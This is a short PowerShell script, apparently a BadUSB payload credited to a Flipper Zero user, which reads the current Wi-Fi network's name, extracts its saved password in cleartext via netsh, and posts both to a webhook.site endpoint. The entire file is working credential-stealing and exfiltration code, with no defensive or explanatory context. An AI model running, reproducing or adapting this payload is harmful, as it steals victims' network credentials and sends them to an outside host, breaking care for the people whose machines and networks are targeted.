# Created by Will | @willsflipper

$ssid = netsh wlan show interface | Select-String -Pattern ' SSID '
$ssid = [string]$ssid
$pos = $ssid.IndexOf(':')
$ssid = $ssid.Substring($pos+2).Trim()
$pass = (((netsh.exe wlan show profiles name="$ssid" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
Invoke-RestMethod -Method Post -Uri "https://webhook.site/46afbcd9-f6d3-4ef8-8e12-a0af8e5eefca" -Body "$ssid : $pass"
